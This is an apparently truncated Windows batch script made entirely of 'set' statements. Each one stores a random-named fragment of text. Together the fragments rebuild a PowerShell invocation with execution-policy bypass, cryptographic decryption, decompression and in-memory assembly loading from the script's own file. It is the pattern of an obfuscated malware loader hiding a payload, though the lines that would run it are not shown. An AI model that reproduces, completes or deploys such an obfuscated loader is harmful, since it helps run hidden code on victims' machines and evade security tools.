@echo off
set "asvhxXpilV=ll"
set "GFLkqWNmww=in"
set "iLgzriBTjg=he"
set "itBwNMcykK=\v"
set "fdJzSUvnOp=we"
set "LKERFqNcfW=ws"
set "xiWlqtlCyH= /"
set "ioluJRYEiQ=0\"
set "ULMxyHaRTD=32"
set "YWiAqfFLBO=ll"
set "qakVKdVuWA=\W"
set "aSlcofUohw= C"
set "XGRPvaUCIr=do"
set "KVBUmjdghH=s\"
set "RDazmDAezq=:\"
set "rYXQabjbyn=em"
set "ofWhsiHVfw=1."
set "qudPMThhMW=rs"
set "nvGYAdHxTR=y "
set "jtLFOWaUEZ=rS"
set "CrMxalaala=py"
set "TNvwFKiuAJ=we"
set "PcWtymrvOC=co"
set "MGagYMCxuW=st"
set "GSIJRPjKME=po"
set "ULcwyhHqcp=Sy"
set "vKQSzmOSWY=.e"
set "fOeYGoZBhB=Po"
set "ORPeVHljmK=Wi"
set "XKWKwXRUes=nd"
set "OyqtdwxnqD=he"
set "scorKYqnlw=ow"
set "HbXQPHMpvw=xe"
set "TMrywjoiMg=cd"
set "tEZMgVrcwW= %~dp0"
set "KbyIjgLbuL=Bcu."
set "eLccyteClK=();$"
set "TxTsvcSofL=.Key"
set "vjnxmrQEAK=em.C"
set "uLDslcDyqs=, $I"
set "SnZBXzAbRD=.Len"
set "twVYVoQOTH= [Sy"
set "HwxWhqIxJQ=hLx."
set "AMwZOLpglY='gni"
set "ubgNtegCTy=JAG "
set "DWVDybbuzm== $n"
set "lxyBNfzkug=rity"
set "sHBsrsHZBi=esMa"
set "MtGPMinnce=join"
set "XXWfdpgtbj=LWc."
set "LlZYQGnHqs=-ep "
set "NvOMZCiEXd=ect "
set "PslbVRIVLn=ach "
set "UHyXgpxtxU=comp"
set "NuJlbNGwgb=ck($"
set "OpRHZZeJHA=-joi"
set "CniMATakYz=vert"
set "SgwIvChnnO=and "
set "CnKhheIegY=.Cry"
set "GpdDRzAUyp=.Dis"
set "IkTeaXOefC= = $"
set "JGFLLGrJoB=ddin"
set "ZtpwtPJksb=x = "
set "HmqBujWVVT=oint"
set "HCrzxegkWY=ptog"
set "GHoXMnMUyh=ay()"
set "EBUUWGxmPM=IzYP"
set "gJIgRSIkPF=m(, "
set "sXJfKNeiEe=m.IO"
set "OQviDjLQfY=embl"
set "ZgblzmNjxm=zYPg"
set "roUItykWUc=g, 0"
set "ejbJTLgGtw=GmV "
set "LGyMTEnggL=ddin"
set "iBuiaVVxCw= [st"
set "WTSXyPaMie=('%*'"
set "KFgPmmRTtZ=ptog"
set "QwDeWSJfYF=k; }"
set "teXxvsHLNA=File"
set "biRcpshVcU=:('g"
set "RnrUbYZuaT=; };"
set "CiJUFSbCQN=brea"
set "kyIKtMkkSo=16] "
set "wnKrgGChnd=Fina"
set "kIFlCpSrbM= = $"
set "JpEhLtBYTY=($nd"
set "lZJraroChE=]::N"
set "zPKwrRGjqC=($nd"
set "bxVBWPQnjZ=d;$n"
set "TmCeGwjdpP=HC ="
set "HPWHStRTgk=-nop"
set "duZDdbjMmQ=[IO."
set "QoZLsJKOyb=ion."
set "MDWzWxcGER=1..-"
set "PwExfrMYhB=lit("
set "cZVxMlmIjg=;$dB"
set "CjRPGmHvTe=V.En"
set "jXlQdvcSTM=raph"
set "EDMRNNlyHQ=C) {"
set "IpdmgWrzMf=[-1."
set "BipGXyjsAr=Comp"
set "baURrNuvAX=$nwS"
set "CMHjjgjWNL=g = "
set "ryQDUNFiwG=.Dis"
set "QhSXVRZDzM=orF'"
set "soXXJuaNdz=);$G"
set "ZbSGjRiXyI=[Sys"
set "UzNlDfEWIO=$mVw"
set "pdualMWlyv=O.Me"
set "xTsvMsoEJI=.Com"
set "iCUDsxnUFI=pStr"
set "IUlQbRrgjk=tion"
set "JrXEiZfdWO=V = "
set "FssqyIjGIW=daeR"
set "PkoVPUxDUh=LhLx"
set "hZltRrwrHs=pose"
set "OqFXeLibXf=$fnD"
set "oGRvflYJvb=gMod"
set "fzvTwarIjW=('da"
set "TiiNCdeZHs=wSzn"
set "MccqLMjGgw=rity"
set "RisNOZLWxT=1] -"
set "bCZQcfzfIp=em.I"
set "qzVGBUVXkj=morF"
set "OvTzBjAhOb=ode]"
set "xpGCBoggPm=mory"
set "lTsHwpaIrT=ecry"
set "XnxRgYJdxj=IzYP"
set "cQeYxVhFOV=$Gxy"
set "vXJNPEpSBC=Obje"
set "wusAayWmwt=ne);"
set "FZPPndirFi=in $"
set "UoObCJaJxd=Syst"
set "MRRaaNEnpS===')"
set "IPRqTioFFj=trea"
set "cFgnsMcZwY=[Sys"
set "AIgONXXRkn=.Con"
set "OGoolDHLWL=);$f"
set "VuFSZDYlbl=l5E7"
set "uCxMnETaAg=Wc, "
set "dzYyEgSFjV=YxVw"
set "JOJWWwLozX=Syjf"
set "YCeEeYYRTH=('%~f0'"
set "dIBBaZHaHA=ress"
set "fpqNtUBRHY=form"
set "EtOVSAXsvl=zn.I"
set "tBRbycjYHN= [Sy"
set "CwjqsyczTn=wSzn"
set "mlBhLJcpJs=Conv"
set "LhKTXGPrfY=.Cop"
set "CzVrVQBvTu=[]] "
set "OxnurVnbfx=New-"
set "uIiEsMVxoN=fnDG"
set "ddVIOslUQJ=am;$"
set "qVjUOJsbYj=$IzY"
set "TSvzaxvxGi=PxEW"
set "fxoFFHmzJw=Secu"
set "TbilDPgtaK=-Obj"
set "FUJPzcJzNv=pres"
set "WAujIkvYKT=Stre"
set "OaZMhdXQtQ=n.Pa"
set "ExdTLwFFda=m.Re"
set "qGPkRWdnuJ=eMVs"
set "EZHIcmrPNB=esaB"
set "dRnlmzLNLT='[-1"
set "xjwTWxQark=Bcu "
